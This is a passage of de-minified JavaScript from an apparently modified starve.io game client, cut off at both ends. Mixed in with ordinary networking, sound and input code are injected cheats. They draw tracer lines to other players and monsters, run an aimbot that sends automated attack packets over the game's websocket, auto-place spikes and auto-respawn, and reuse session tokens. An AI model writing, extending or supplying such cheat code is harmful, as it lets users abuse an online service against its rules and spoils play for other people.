                                                        window.AutoDrinkWait = !1;
                                                    break;
                                                case 40:
                                                    a.get_bag();
                                                    break;
                                                case 41:
                                                    a.verified_account(i);
                                                    break;
                                                case 42:
                                                    a.succeed_quest(i[1]);
                                                    break;
                                                case 43:
                                                    a.fail_quest(i[1]);
                                                    break;
                                                case 44:
                                                    a.claimed(i[1]);
                                                    break;
                                                case 45:
                                                    a.recycle_ok(i[1]);
                                                    break;
                                                case 46:
                                                    a.recycle_stop(i[1]);
                                                    break;
                                                case 47:
                                                    a.well(i[1]);
                                                    break;
                                                case 48:
                                                    a.no_resources();
                                                    break;
                                                case 50:
                                                    a.decrease_item2(i[1], i[2], i[3]);
                                                    break;
                                                case 51:
                                                    a.blocked();
                                                    break;
                                                case 52:
                                                    a.delete_inv_ok(i[1]);
                                                    break;
                                                case 53:
                                                    a.delete_one_inv_ok(i[1]);
                                                    break;
                                                case 54:
                                                    a.account_ok();
                                                    break;
                                                case 55:
                                                    a.gauges_warm(i[1]);
                                                    break;
                                                case 56:
                                                    a.gauges_cold(i[1]);
                                                    break;
                                                case 57:
                                                    a.new_version();
                                                    break;
                                                case 58:
                                                    a.wrong_password();
                                                    break;
                                                case 59:
                                                    a.clean_inventory();
                                                    break;
                                                case 60:
                                                    a.hide_shop_kit();
                                                    break;
                                                case 61:
                                                    xe.cam.forcedDelay = .2,
                                                        xe.cam.delay = 3;
                                                    break;
                                                case 62:
                                                    a.delete_single_inv(new Uint16Array(e.data));
                                                    break;
                                                case 63:
                                                    a.hide_clock();
                                                    break;
                                                case 64:
                                                    a.hide_recipe_book();
                                                    break;
                                                case 65:
                                                    a.hide_quest();
                                                    break;
                                                case 66:
                                                    a.hide_market();
                                                    break;
                                                case 67:
                                                    a.explorer_quest(i[1]);
                                                    break;
                                                case 68:
                                                    a.sand_tempest(i[2]);
                                                    break;
                                                case 69:
                                                    a.blizzard(i[2]);
                                                    break;
                                                case 70:
                                                    a.blizzard_status(i[1]);
                                                    break;
                                                case 71:
                                                    a.bandage(i[1]);
                                                    break;
                                                case 72:
                                                    a.remove_entity(e.data)
                                            }
                                        }
                                }
                                ,
                                this.recreate_session = function () {
                                    clearTimeout(a.timeout_handler),
                                        xe.newToken = xe.newToken || Utils.getURLData("token"),
                                        window.threadSafe.dataSentCounter = 0,
                                        a.sendJson([Se.nickname.input.value, screen.width + 200, screen.height + 200, T.VERSION, "cbDmZbWU;7eP@7", xe.token_id, xe.reconnect.enabled ? 1 : 0, Se.skin, Se.accessory, Se.bag, Se.book, Se.crate, Se.dead, void 0 === Y2 ? 0 : Y2, void 0 === U2 ? 0 : U2.substring(U2.length - 50), e2, xe.newToken]),
                                        xe.newToken = void 0,
                                        console.log([Se.nickname.input.value, screen.width + 200, screen.height + 200, T.VERSION, "cbDmZbWU;7eP@7", xe.token_id, xe.reconnect.enabled ? 1 : 0, Se.skin, Se.accessory, Se.bag, Se.book, Se.crate, Se.dead, void 0 === Y2 ? 0 : Y2, void 0 === U2 ? 0 : U2.substring(U2.length - 50), e2, xe.newToken]),
                                        a.timeout_handler = setTimeout(a.timeout, i2.TIMEOUT_TIME)
                                }
                                ,
                                this.sendJson = function (e) {
                                    this.socket.send(V.encode(e))
                                }
                                ,
                                this.socket.onopen = function () {
                                    var e = (Settings.Tokenjoin.e ? Settings.Tokenjoin : xe).token;
                                    clearTimeout(a.timeout_handler),
                                        xe.newToken = xe.newToken || Utils.getURLData("token"),
                                        a.sendJson([Se.nickname.input.value, screen.width + 200, screen.height + 200, T.VERSION, e, xe.token_id, xe.reconnect.enabled ? 1 : 0, Se.skin, Se.accessory, Se.bag, Se.book, Se.crate, Se.dead, void 0 === Y2 ? 0 : Y2, void 0 === U2 ? 0 : U2.substring(U2.length - 50), e2, xe.newToken]),
                                        xe.newToken = void 0,
                                        a.timeout_handler = setTimeout(a.timeout, i2.TIMEOUT_TIME),
                                        console.log([Se.nickname.input.value, screen.width + 200, screen.height + 200, T.VERSION, e, xe.token_id, xe.reconnect.enabled ? 1 : 0, Se.skin, Se.accessory, Se.bag, Se.book, Se.crate, Se.dead, void 0 === Y2 ? 0 : Y2, void 0 === U2 ? 0 : U2.substring(U2.length - 50), e2, xe.newToken])
                                }
                                ,
                                this.timeout_handler = setTimeout(a.timeout, i2.TIMEOUT_TIME)
                        }
                }
                ;
            var Fe, xe, To, Je = {
                is_run: !1
            }, Xe = new function () {
                this.run = 0,
                    this.loaded = 0,
                    this.transition = 0,
                    this.get_x = function (e) {
                        return e / Fe.w * 100
                    }
                    ,
                    this.get_y = function (e) {
                        return e / Fe.h * 100
                    }
                    ,
                    this.get_x_ext = function (e, t) {
                        return e = this.get_x(e) - this.ltr.x,
                            this.ltr.x + t * e
                    }
                    ,
                    this.get_y_ext = function (e, t) {
                        return e = Math.abs(this.get_y(e) - this.ltr.y),
                            this.ltr.y + t * e
                    }
                    ,
                    this.sample = {},
                    this.samples = {},
                    this.player = {},
                    this.play_sample = function (e, t, i, n) {
                        for (var r = 0; r < t.length; r++) {
                            var o = t[r];
                            if (!e.playing(o))
                                return e.pos(i, n, -.5, o),
                                    e.play(o),
                                    !0
                        }
                        return !1
                    }
                    ,
                    this.hit = function (e, t, i, n) {
                        i = this.get_x_ext(i, SOUND_PLAYER.FACTOR),
                            n = this.get_y_ext(n, SOUND_PLAYER.FACTOR),
                            e ? 1 === t ? this.play_sample(this.player.hstone, this.sample.hstone, i, n) : 0 === t && this.play_sample(this.player.hwood, this.sample.hwood, i, n) : this.play_sample(this.player.hand, this.sample.hand, i, n)
                    }
                    ,
                    this.ltr = {
                        x: 0,
                        y: 0
                    },
                    this.oldp = {
                        x: 0,
                        y: 0
                    },
                    this.area = {},
                    this.players = [],
                    this.ambience = function (e, t) {
                        for (var i in this.area) {
                            i = this.area[i];
                            i.check(e),
                                i.inside && (Fe.clock.now < d.DISABLE_EFFECT && i.effect(),
                                    t && i.update(e, this.ltr),
                                    this.transition) && i.transition()
                        }
                        this.transition && (this.transition = 0)
                    }
                    ,
                    this.hook_players = function () {
                        for (var e = [], t = 0; t < this.players.length; t++)
                            (r = this.players[t]).free ? e.push(t) : r.free || Fe.fast_units[r.uid] || (r.clean(),
                                e.push(t));
                        for (var i = Fe.units[Ye.PLAYERS], n = t = 0; t < i.length && n < e.length; t++) {
                            var r = i[t];
                            Fe.mode == Ue.MODE_HUNGER_GAMES && "spectator" === Fe.players[r.id].nickname || -1 !== r.sid || r.uid === xe.uid || (this.players[e[n]].init(r.uid),
                                n++)
                        }
                    }
                    ,
                    this.players_effect = function () {
                        this.hook_players();
                        for (var e = 0; e < this.players.length; e++) {
                            var t = this.players[e];
                            !t.free && t.check() && t.update()
                        }
                    }
                    ,
                    this.update_listener = function (e) {
                        return this.oldp.x === e.x && this.oldp.y === e.y ? 0 : (this.oldp.x = e.x,
                            this.oldp.y = e.y,
                            this.ltr.x = this.get_x(e.x),
                            this.ltr.y = this.get_y(e.y),
                            Howler.pos(this.ltr.x, this.ltr.y, 0),
                            1)
                    }
                    ,
                    this.scheduler = function () {
                        var e, t;
                        this.run && this.loaded && (e = Fe.fast_units[xe.uid]) && (e.sid = 0,
                            t = this.update_listener(e),
                            Fe.mode !== Ue.MODE_ZOMBIES && Fe.mode !== Ue.MODE_LEGACY && Fe.mode !== Ue.MODE_BR && this.ambience(e, t),
                            this.players_effect())
                    }
                    ,
                    this.load_sound = function () {
                        for (var e in P2) {
                            var t, i = P2[e];
                            for (t in "object" == typeof i && i.path && (i.sound = new Howl({
                                src: i.path,
                                volume: 0,
                                sprite: i.sprite
                            })),
                                i.sample) {
                                for (var n = i.sample[t], r = [], o = 0; o < n; o++) {
                                    var a = i.sound.play(t);
                                    i.sound.stop(a),
                                        i.sound.on("fade", function (e) {
                                            this.volume(e) || this.stop(e)
                                        }, a),
                                        r.push(a)
                                }
                                Xe.sample[t] = 1 < r.length ? r : r[0],
                                    Xe.player[t] = i.sound
                            }
                        }
                    }
                    ,
                    this.volume_sample = function (e, t, i) {
                        for (var n = 0; n < e.length; n++)
                            t.volume(i, e[n])
                    }
                    ,
                    this.organize_samples = function (e, t, i, n, r, o) {
                        for (var a = e, s = 0; s < i; s++) {
                            var _ = a[s] = [];
                            for (j = 0; j < n; j++)
                                _[j] = Xe.sample[r + j][s],
                                    t.sound.volume(o, _[j])
                        }
                    }
                    ,
                    this.init = function () {
                        Xe.load_sound(),
                            Xe.samples.punch = [],
                            Xe.samples.weapon = [],
                            Xe.samples.dig = [],
                            Xe.organize_samples(Xe.samples.punch, P2.PUNCH, d.PLAYERS, 3, "p", .15),
                            Xe.organize_samples(Xe.samples.weapon, P2.WEAPON, d.PLAYERS, 4, "w", .15),
                            Xe.organize_samples(Xe.samples.dig, P2.DIG, d.PLAYERS, 3, "d", .09),
                            Xe.volume_sample(Xe.sample.hand, Xe.player.hand, .15),
                            Xe.volume_sample(Xe.sample.hwood, Xe.player.hwood, .2),
                            Xe.volume_sample(Xe.sample.hstone, Xe.player.hstone, 1),
                            Xe.area.sea = new f2(d.SEA_DELAY, this.sample.seanight, this.sample.seaday, d.SEA_FADE, .05, .4, P2.AMBIENCE.sound, d.TRANSITION, {
                                x: ze.SEE_BIOME_X,
                                y: ze.WINTER_BIOME_Y,
                                w: Fe.w,
                                h: Fe.h
                            }, {
                                x: ze.SEE_BIOME_X - 2300,
                                y: ze.WINTER_BIOME_Y - 4e3,
                                w: Fe.w,
                                h: Fe.h
                            }, {
                                x: ze.SEE_BIOME_X - 1500,
                                y: ze.WINTER_BIOME_Y - 2e3,
                                w: Fe.w,
                                h: Fe.h
                            }),
                            Xe.area.forest = new f2(d.FOREST_DELAY, this.sample.forestnight, this.sample.forestday, d.FOREST_FADE, .03, .25, P2.AMBIENCE.sound, d.TRANSITION, {
                                x: 0,
                                y: ze.WINTER_BIOME_Y + 800,
                                w: ze.SEE_BIOME_X - 2300,
                                h: Fe.h
                            }, {
                                x: -100,
                                y: ze.WINTER_BIOME_Y - 300,
                                w: ze.SEE_BIOME_X - 100,
                                h: Fe.h
                            }, {
                                x: -100,
                                y: ze.WINTER_BIOME_Y + 400,
                                w: ze.SEE_BIOME_X - 1400,
                                h: Fe.h
                            }),
                            Xe.area.snow = new f2(d.FOREST_DELAY, this.sample.snownight, this.sample.snowday, d.SNOW_FADE, .01, .22, P2.AMBIENCE.sound, d.TRANSITION, {
                                x: -100,
                                y: -100,
                                w: Fe.w + 200,
                                h: ze.WINTER_BIOME_Y - 1e3
                            }, {
                                x: -100,
                                y: -100,
                                w: Fe.w + 200,
                                h: ze.WINTER_BIOME_Y + 600
                            }, {
                                x: -100,
                                y: -100,
                                w: Fe.w + 200,
                                h: ze.WINTER_BIOME_Y + 100
                            });
                        for (var e = 0; e < d.PLAYERS; e++)
                            Xe.players[e] = new L2(e);
                        Xe.players[0].init(xe.uid),
                            Xe.loaded = 1
                    }
                    ,
                    this.launch = function () {
                        !this.transition && Fe.clock.now < d.DISABLE_EFFECT && (this.transition = 1)
                    }
                    ,
                    this.quit = function () {
                        if (this.run && this.loaded) {
                            for (var e in Xe.sample) {
                                var t = Xe.sample[e];
                                if ("object" == typeof t)
                                    for (var i = 0; i < t.length; i++)
                                        Xe.player[e].stop(t[i]);
                                else
                                    Xe.player[e].stop(t)
                            }
                            for (i = 0; i < Xe.players.length; i++)
                                Xe.players[i].clean()
                        }
                    }
                    ,
                    this.select = function () {
                        Xe.run ? Xe.quit() : (Xe.loaded || Xe.init(),
                            Xe.players[0].uid = xe.uid,
                            Xe.players[0].free = 0,
                            Xe.launch()),
                            Xe.run = !Xe.run
                    }
            }
                , Ao = new function () {
                    this.set_azerty = function () {
                        this.LEFT = 81,
                            this.RIGHT = 68,
                            this.TOP = 90,
                            this.DOWN = 83
                    }
                        ,
                        this.set_qwerty = function () {
                            this.LEFT = 65,
                                this.RIGHT = 68,
                                this.TOP = 87,
                                this.BOTTOM = 83
                        }
                        ,
                        this.UP = 0,
                        this.DOWN = 1,
                        this._1 = 49,
                        this._2 = 50,
                        this._3 = 51,
                        this._4 = 52,
                        this._5 = 53,
                        this.CTRL = 17,
                        this.ARROW_LEFT = 37,
                        this.ARROW_RIGHT = 39,
                        this.ARROW_TOP = 38,
                        this.ARROW_BOTTOM = 40,
                        this.SPACE = 32,
                        this.R = 82,
                        this.G = 71,
                        this.V = 86,
                        this.B = 66,
                        this.set_qwerty(),
                        this.keys = new Array(255);
                    for (var e = 0; e < 255; e++)
                        this.keys[e] = this.UP;
                    this.up = function (e) {
                        e = Math.min(e.charCode || e.keyCode, 255);
                        this.keys[e] = this.UP
                    }
                        ,
                        this.down = function (e) {
                            e = Math.min(e.charCode || e.keyCode, 255);
                            return e == this.LEFT || e == this.ARROW_LEFT ? this.press_left() : e == this.TOP || e == this.ARROW_TOP ? this.press_top() : e == this.DOWN || e == this.ARROW_DOWN ? this.press_bottom() : e != this.RIGHT && e != this.ARROW_RIGHT || this.press_right(),
                                this.keys[e] = this.DOWN,
                                e
                        }
                        ,
                        this.press_left = function () {
                            this.keys[this.RIGHT] = this.UP,
                                this.keys[this.ARROW_RIGHT] = this.UP
                        }
                        ,
                        this.press_right = function () {
                            this.keys[this.LEFT] = this.UP,
                                this.keys[this.ARROW_LEFT] = this.UP
                        }
                        ,
                        this.press_bottom = function () {
                            this.keys[this.TOP] = this.UP,
                                this.keys[this.ARROW_TOP] = this.UP
                        }
                        ,
                        this.press_top = function () {
                            this.keys[this.BOTTOM] = this.UP,
                                this.keys[this.ARROW_BOTTOM] = this.UP
                        }
                        ,
                        this.clear_directionnal = function () {
                            this.keys[this.RIGHT] = this.UP,
                                this.keys[this.ARROW_RIGHT] = this.UP,
                                this.keys[this.LEFT] = this.UP,
                                this.keys[this.ARROW_LEFT] = this.UP,
                                this.keys[this.TOP] = this.UP,
                                this.keys[this.ARROW_TOP] = this.UP,
                                this.keys[this.BOTTOM] = this.UP,
                                this.keys[this.ARROW_BOTTOM] = this.UP
                        }
                        ,
                        this.is_left = function () {
                            return this.keys[this.LEFT] || this.keys[this.ARROW_LEFT]
                        }
                        ,
                        this.is_right = function () {
                            return this.keys[this.RIGHT] || this.keys[this.ARROW_RIGHT]
                        }
                        ,
                        this.is_top = function () {
                            return this.keys[this.TOP] || this.keys[this.ARROW_TOP]
                        }
                        ,
                        this.is_bottom = function () {
                            return this.keys[this.BOTTOM] || this.keys[this.ARROW_BOTTOM]
                        }
                        ,
                        this.is_ctrl = function () {
                            return this.keys[this.CTRL]
                        }
                        ,
                        this.is_1 = function () {
                            return this.keys[this._1]
                        }
                        ,
                        this.is_2 = function () {
                            return this.keys[this._2]
                        }
                        ,
                        this.is_3 = function () {
                            return this.keys[this._3]
                        }
                        ,
                        this.is_4 = function () {
                            return this.keys[this._4]
                        }
                        ,
                        this.is_space = function () {
                            return this.keys[this.SPACE]
                        }
                        ,
                        this.is_r = function () {
                            return this.keys[this.R]
                        }
                        ,
                        this.is_g = function () {
                            return this.keys[this.G]
                        }
                        ,
                        this.is_v = function () {
                            return this.keys[this.V]
                        }
                        ,
                        this.is_b = function () {
                            return this.keys[this.B]
                        }
                }
                , je = new function () {
                    this.DOWN = 0,
                        this.UP = 1,
                        this.IDLE = 2,
                        this.IN = 0,
                        this.OUT = 1,
                        this.pos = {
                            x: 0,
                            y: 0
                        },
                        this.x_old = 0,
                        this.y_old = 0,
                        this.angle = 0,
                        this.state = this.IDLE,
                        this.dist = this.IN,
                        this.down = function () {
                            this.state = this.DOWN
                        }
                        ,
                        this.up = function () {
                            this.state = this.UP
                        }
                        ,
                        this.update = function () {
                            return (this.pos.x != this.x_old || this.pos.y != this.y_old) && (this.x_old = this.pos.x,
                                this.y_old = this.pos.y,
                                !0)
                        }
                }
                , qe = 0, ho = 0, lo = new function (e, t, i) {
                    this.can = e,
                        this.ctx = t,
                        this.logo = {
                            translate: {
                                x: 0,
                                y: 0
                            },
                            style: document.getElementById("loading").style,
                            update: function () {
                                this.style.left = this.translate.x + "px",
                                    this.style.top = Math.floor(this.translate.y) + "px"
                            }
                        },
                        this.logo.style.position = "absolute",
                        this.logo.style.display = "inline-block",
                        this.logo.update(),
                        this.is_run = !0,
                        this.stop = function () {
                            this.is_run = !1
                        }
                        ,
                        this.loading = {
                            total: 1
                        };
                    var n = this
                        , r = function () { }
                        , o = 0;
                    function a(e) {
                        return -1 === e.indexOf("normal-mode") && -1 === e.indexOf("player0") && (-1 !== e.indexOf("day-bag") || -1 !== e.indexOf("night-bag") || -1 !== e.indexOf("day-book") || -1 !== e.indexOf("night-book") || -1 !== e.indexOf("day-player") || -1 !== e.indexOf("night-player") || -1 !== e.indexOf("day-accessory") || -1 !== e.indexOf("night-accessory") || -1 !== e.indexOf("day-crate") || -1 !== e.indexOf("night-crate") || -1 !== e.indexOf("day-skin") || -1 !== e.indexOf("night-skin") || -1 !== e.indexOf("day-river") || -1 !== e.indexOf("night-river") || -1 !== e.indexOf("day-river") || -1 !== e.indexOf("night-river") || -1 !== e.indexOf("day-rock") || -1 !== e.indexOf("night-rock") || -1 !== e.indexOf("day-flower") || -1 !== e.indexOf("night-flower") || -1 !== e.indexOf("day-leaf") || -1 !== e.indexOf("night-leaf") || -1 !== e.indexOf("day-herb") || -1 !== e.indexOf("night-herb") || -1 !== e.indexOf("day-shell") || -1 !== e.indexOf("night-shell") || -1 !== e.indexOf("day-hand-skin") || -1 !== e.indexOf("night-hand-skin") || -1 !== e.indexOf("bignight") || -1 !== e.indexOf("bigday") || -1 !== e.indexOf("bigzday") || -1 !== e.indexOf("bigznight") || -1 !== e.indexOf("tutorial-box") || -1 !== e.indexOf("tuto-") || -1 !== e.indexOf("-leaderboard-") || -1 !== e.indexOf("-lead-") || -1 !== e.indexOf("day-lava-") || -1 !== e.indexOf("night-lava-") || -1 !== e.indexOf("-click.png") || -1 !== e.indexOf("-in.png") || -1 !== e.indexOf("-fog") || -1 !== e.indexOf("-lava") || -1 !== e.indexOf("pebblecompo") || -1 !== e.indexOf("avatar-player")) ? 0 : 1
                    }
                    this.quit_effect = function () {
                        n.update(),
                            40 == ++o ? (n.stop(),
                                r()) : window.setTimeout(n.quit_effect, 33)
                    }
                        ,
                        this.quit = function (e) {
                            r = e,
                                n.quit_effect()
                        }
                        ,
                        (new Date).getTime();
                    var s, _ = Object.keys(IMAGES).length;
                    for (s in console.log("Image to load: ", _),
                        IMAGES)
                        0 === a(IMAGES[s]) && _--;
                    console.log("Image to load with high priority: ", _);
                    var E = function () {
                        return 0 !== this.isLoaded ? this.isLoaded : (this.isLoaded = 2,
                            this.src = this._src,
                            0)
                    }
                        , u = function () {
                            this.isLoaded = 1
                        }
                        , d = 0
                        , T = function (e) {
                            e && 1 !== d && (d = 1,
                                Qe !== Ie && Ie(),
                                Qe(),
                                null === (e = Utils.getURLData("server")) ? client.store_server_list() : (client.privateServer = 1,
                                    client.server_list = [{
                                        nu: 0,
                                        m: 100,
                                        i: "server" + e + ".starve.io",
                                        p: 443,
                                        a: "Private Server " + e,
                                        ssl: 1
                                    }]),
                                client.update_server_list(),
                                setTimeout(i, 100))
                        }
                        , A = function () {
                            client.xhttp_get(T, N2)
                        }
                        , h = function () {
                            document.fonts && document.fonts.check ? document.fonts.check("1em Baloo Paaji") ? setTimeout(A, 100) : setTimeout(h, 100) : setTimeout(A, 1e3)
                        }
                        , l = function () {
                            var t = this.src
                                , e = 0 === a(t) ? 1e4 : 2e3;
                            setTimeout(function () {
                                for (var e in DUMP_IMAGES)
                                    if (-1 !== t.indexOf(DUMP_IMAGES[e])) {
                                        IMAGES[e] = new Image,
                                            IMAGES[e].onload = u,
                                            IMAGES[e].onerror = l,
                                            IMAGES[e].src = t;
                                        break
                                    }
                            }, e)
                        };
                    function I(e) {
                        for (var t in IMAGES) {
                            var i = IMAGES[t];
                            "string" == typeof i && a(i) === e && (IMAGES[t] = new Image,
                                IMAGES[t].isLoaded = 0,
                                IMAGES[t].onload = u,
                                IMAGES[t].onerror = l,
                                IMAGES[t].tryLoad = E,
                                "https:" !== window.location.protocol ? IMAGES[t]._src = i : IMAGES[t]._src = "https://starve.io/" + i)
                        }
                    }
                    I(1),
                        I(0),
                        Tt(1, "l", 20, "#000"),
                        h(),
                        V0(),
                        this.update = function () {
                            this.logo.translate.x = (Le - 500) / 2,
                                this.logo.translate.y = (Ge - 150) / 2;
                            var e = 2500 / (40 - o + 1) - 48;
                            this.logo.translate.y -= e,
                                this.logo.update()
                        }
                        ,
                        this.logo.update(),
                        this.draw = function () {
                            try {
                                K0()
                            } catch (e) { }
                            this.update()
                        }
                }
                    (J, fe, function () {
                        k0(),
                            Je = new m2(J, fe),
                            (Se = new S2(J, fe)).login_after(),
                            To = new M2(J, fe),
                            Fe = new _2,
                            xe = new u2,
                            lo.quit(function () {
                                lo.logo.style.display = "none",
                                    Se.run()
                            })
                    }
                    );
            window.onbeforeunload = function () {
                if (Je.is_run)
                    return "Are you sure you want quit starve.io ;-; ?"
            }
                ,
                window.errorReporter = function () {
                    alert(arguments[0])
                }
                ,
                Q(),
                function e(t) {
                    for (hack in window.requestAnimationFrame(e),
                        qe = (t - ho) / 1e3,
                        ho = t,
                        qe = 1 < qe ? 1 : qe,
                        Je.is_run ? Je.draw() : (fe.clearRect(0, 0, Le, Ge),
                            lo.is_run ? lo.draw() : Se.is_run ? Se.draw() : To.is_run && To.draw()),
                        this.YE = 20,
                        Settings)
                        Settings[hack].e && Settings[hack].k && (fe.font = "18px Baloo Paaji",
                            fe.strokeStyle = "#000000",
                            fe.lineWidth = 7,
                            fe.fillStyle = "#ff0000",
                            fe.strokeText(hack, 0, this.YE),
                            fe.fillText(hack, 0, this.YE),
                            this.YE += 20)
                }(0);
            var Io;
            document.addEventListener("keydown", function (e) {
                "chat_input" !== document.activeElement.id.toLowerCase() && (e.code == Settings.AutoSpike.k && (Settings.AutoSpike.e = !0),
                    e.code == Settings.AMB.k) && (Settings.AMB.e = !Settings.AMB.e)
            }),
                document.addEventListener("keyup", function (e) {
                    "chat_input" !== document.activeElement.id.toLowerCase() && e.code == Settings.AutoSpike.k && (Settings.AutoSpike.e = !1)
                }),
                setTimeout(() => {
                    window.requestAnimationFrame(function e(t) {
                        if (window.requestAnimationFrame(e),
                            xe.alive && Fe.fast_units[xe.uid]) {
                            if (Settings.Tracers) {
                                if (0 < Fe.units[Ye.KRAKEN].length) {
                                    for (let e = 0; e < Fe.units[Ye.KRAKEN].length; e++)
                                        fe.beginPath(),
                                            fe.moveTo(xe.cam.x + Fe.fast_units[xe.uid].x, xe.cam.y + Fe.fast_units[xe.uid].y),
                                            fe.lineTo(xe.cam.x + Fe.units[Ye.KRAKEN][e].x, xe.cam.y + Fe.units[Ye.KRAKEN][e].y),
                                            fe.strokeStyle = "purple",
                                            fe.stroke();
                                    fe.save(),
                                        fe.font = "18px Baloo Paaji",
                                        fe.strokeStyle = "black",
                                        fe.lineWidth = 7,
                                        fe.strokeText("Kraken Amount: " + Fe.units[Ye.KRAKEN].length, 0, 715),
                                        fe.fillStyle = "white",
                                        fe.fillText("Kraken Amount: " + Fe.units[Ye.KRAKEN].length, 0, 715),
                                        fe.restore()
                                }
                                if (0 < Fe.units[Ye.SAND_WORM].length) {
                                    for (let e = 0; e < Fe.units[Ye.SAND_WORM].length; e++)
                                        fe.beginPath(),
                                            fe.moveTo(xe.cam.x + Fe.fast_units[xe.uid].x, xe.cam.y + Fe.fast_units[xe.uid].y),
                                            fe.lineTo(xe.cam.x + Fe.units[Ye.SAND_WORM][e].x, xe.cam.y + Fe.units[Ye.SAND_WORM][e].y),
                                            fe.strokeStyle = "black",
                                            fe.stroke();
                                    fe.save(),
                                        fe.font = "18px Baloo Paaji",
                                        fe.strokeStyle = "black",
                                        fe.lineWidth = 7,
                                        fe.strokeText("Sandworm Amount: " + Fe.units[Ye.SAND_WORM].length, 0, 690),
                                        fe.fillStyle = "white",
                                        fe.fillText("Sandworm Amount: " + Fe.units[Ye.SAND_WORM].length, 0, 690),
                                        fe.restore()
                                }
                                fe.save();
                                for (let e = 0; e < Fe.units[Ye.PLAYERS].length; e++) {
                                    Fe.units[Ye.PLAYERS][e].ally = xe.id === Fe.units[Ye.PLAYERS][e].pid || A0(Fe.units[Ye.PLAYERS][e].pid),
                                        Fe.units[Ye.PLAYERS][e].pid !== xe.id && (fe.lineWidth = 2.6,
                                            fe.beginPath(),
                                            fe.moveTo(xe.cam.x + Fe.fast_units[xe.uid].x - 15, xe.cam.y + Fe.fast_units[xe.uid].y),
                                            fe.lineTo(xe.cam.x + Fe.units[Ye.PLAYERS][e].x - 15, xe.cam.y + Fe.units[Ye.PLAYERS][e].y),
                                            fe.strokeStyle = Fe.units[Ye.PLAYERS][e].player.nickname.includes("山田") || Fe.units[Ye.PLAYERS][e].ally ? "cyan" : "red",
                                            fe.stroke()),
                                        fe.save();
                                    var i = Fe.units[Ye.PLAYERS][e].ally;
                                    fe.font = "16px Baloo Paaji",
                                        fe.strokeStyle = "black",
                                        fe.lineWidth = 7,
                                        fe.strokeText(Fe.units[Ye.PLAYERS][e].player.nickname.includes("山田") || i ? "TEAM" : "EMEMY", xe.cam.x + Fe.units[Ye.PLAYERS][e].x - 15, xe.cam.y + Fe.units[Ye.PLAYERS][e].y),
                                        fe.fillStyle = Fe.units[Ye.PLAYERS][e].player.nickname.includes("山田") || Fe.units[Ye.PLAYERS][e].ally ? "cyan" : "red",
                                        fe.fillText(Fe.units[Ye.PLAYERS][e].player.nickname.includes("山田") || i ? "TEAM" : "EMEMY", xe.cam.x + Fe.units[Ye.PLAYERS][e].x - 15, xe.cam.y + Fe.units[Ye.PLAYERS][e].y),
                                        fe.restore()
                                }
                                fe.restore(),
                                    fe.save();
                                for (let e = 0; e < Fe.units[Ye.HAWK].length; e++)
                                    Fe.units[Ye.HAWK][e].pid !== xe.id && (fe.lineWidth = 2.6,
                                        fe.beginPath(),
                                        fe.moveTo(xe.cam.x + Fe.fast_units[xe.uid].x, xe.cam.y + Fe.fast_units[xe.uid].y),
                                        fe.lineTo(xe.cam.x + Fe.units[Ye.HAWK][e].x, xe.cam.y + Fe.units[Ye.HAWK][e].y),
                                        fe.strokeStyle = "brown",
                                        fe.stroke());
                                fe.restore()
                            }
                            if (fe.save(),
                                fe.font = "16px Baloo Paaji",
                                fe.strokeStyle = "black",
                                fe.lineWidth = 7,
                                fe.strokeText("AutoSpike:" + Settings.AutoSpike.e, xe.cam.x + Fe.fast_units[xe.uid].x - 50, xe.cam.y + Fe.fast_units[xe.uid].y),
                                fe.fillStyle = "white",
                                fe.fillText("AutoSpike:" + Settings.AutoSpike.e, xe.cam.x + Fe.fast_units[xe.uid].x - 50, xe.cam.y + Fe.fast_units[xe.uid].y),
                                fe.restore(),
                                fe.save(),
                                fe.font = "16px Baloo Paaji",
                                fe.strokeStyle = "black",
                                fe.lineWidth = 7,
                                fe.strokeText("Aimbot:" + Settings.AMB.e, xe.cam.x + Fe.fast_units[xe.uid].x - 50, xe.cam.y + Fe.fast_units[xe.uid].y + 20),
                                fe.fillStyle = "white",
                                fe.fillText("Aimbot:" + Settings.AMB.e, xe.cam.x + Fe.fast_units[xe.uid].x - 50, xe.cam.y + Fe.fast_units[xe.uid].y + 20),
                                fe.restore(),
                                client.socket && xe.alive) {
                                var n, r, o, a = Fe.fast_units[xe.uid];
                                client.socket && xe.alive && 1 == client.socket.readyState && a && (1 == client.socket.readyState && a && Settings.PathFinder.e && client.boompathfind({
                                    x: Math.floor(Fe.fast_units[xe.uid].x / 100),
                                    y: Math.floor(Fe.fast_units[xe.uid].y / 100)
                                }, client.PathfinderEnd),
                                    500 < Date.now() - client.gogo) && (client.gogo = Date.now(),
                                        -1 == a.right) && client.socket.readyState,
                                    Date.now();
                                if (Settings.AMB.e && client.socket && xe.alive && 1 == client.socket.readyState && a) {
                                    switch (client.WHATTHEFUCK(a.right, !0)) {
                                        case 1:
                                            var s = a.fly ? 196.8 : 157.6;
                                            break;
                                        case 2:
                                            var s = a.fly ? 291.8 : 227.6;
                                            break;
                                        case 3:
                                            s = 620;
                                            break;
                                        case 4:
                                            s = a.fly ? 140 : 125;
                                            break;
                                        case 5:
                                            a.clothe != ze.WINTER_HOOD && a.clothe != ze.HOOD || (s = a.fly ? 120.8 : 97.6)
                                    }
                                    s && ((r = client.findenemiesrangexyzbooboo(a, Fe.units[Ye.PLAYERS])) && (n = client.dist2dSQRT(a, r)) <= s ? (r = client.calcAngle(a, r, !0),
                                        o = 2 * Math.PI,
                                        o = Math.floor((r + o) % o * 255 / o),
                                        client.sendJson([3, o]),
                                        Settings.AMB.a = r,
                                        n <= s - 22 && client.sendJson([4, o])) : (Settings.AMB.a = null,
                                            0 == xe.control.attack && client.sendJson([14])))
                                }
                            }
                        }
                    }),
                        workerTimers.setInterval(() => {
                            client.socket && 0 != client.socket.readyState && 1 != client.socket.readyState && !xe.alive && Settings.Respawn && client.connect()
                        }
                            , 5e3),
                        workerTimers.setInterval(() => {
                            var e = Fe.fast_units[xe.uid];
                            if (client.socket && Settings.AutoSpike.e && client.socket && 1 == client.socket.readyState && e) {
                                for (let e = 0, t = ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall"]; e < t.length; e++) {
                                    var i = t[e];
                                    switch (i) {
                                        case "Reidite Spike":
                                            i = 213;
                                            break;
                                        case "Amethyst Spike":
                                            i = 117;
                                            break;
                                        case "Diamond Spike":
                                            i = 164;
                                            break;
                                        case "Gold Spike":
                                            i = 163;
                                            break;
                                        case "Stone Spike":
                                            i = 162;
                                            break;
                                        case "Wood Spike":
                                            i = 154;
                                            break;
                                        case "Wood Wall":
                                            i = 156;
                                            break;
                                        case "Nothing":
                                            i = -1
                                    }
